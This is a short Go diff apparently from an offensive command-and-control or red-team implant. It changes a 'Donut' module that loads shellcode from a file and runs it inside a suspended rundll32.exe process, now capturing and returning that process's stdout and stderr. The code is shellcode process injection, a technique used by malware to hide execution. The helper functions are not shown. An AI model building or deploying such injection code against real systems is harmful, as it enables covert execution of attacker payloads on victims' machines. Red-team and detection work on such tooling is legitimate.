@@ -26,12 +26,31 @@ func init() {
 func (d *Donut) Run(command string, timeout int) ([]byte, string, string) {
 	bytes, _ := ioutil.ReadFile("something.donut")
 
-	handle, _, _, _ := CreateSuspendedProcessWIORedirect("rundll32.exe")
+	handle, stdout, stderr := CreateSuspendedProcessWIORedirect("rundll32.exe")
 
-	task, pid := Runner(bytes, handle)
+	//Start reading from the process output
+
+
+	stdoutBytes := make([]byte, 4096)
+	stderrBytes := make([]byte, 4096)
+
+	// Run the shellcode and wait for it to complete
+	task, pid := Runner(bytes, handle, stdout, &stdoutBytes, stderr, &stderrBytes)
 
 	if task {
-		return []byte("Shellcode executed successfully. Yay."), execute.SUCCESS_STATUS, pid
+
+		// Assemble the final output
+
+		total := "Shellcode executed successfully.\n\n"
+
+		total += "STDOUT:\n"
+		total += string(stdoutBytes)
+		total += "\n\n"
+
+		total += "STDERR:\n"
+		total += string(stderrBytes)
+
+		return []byte(total), execute.SUCCESS_STATUS, pid
 	}
 	return []byte("Shellcode execution failed."), execute.ERROR_STATUS, pid
 }
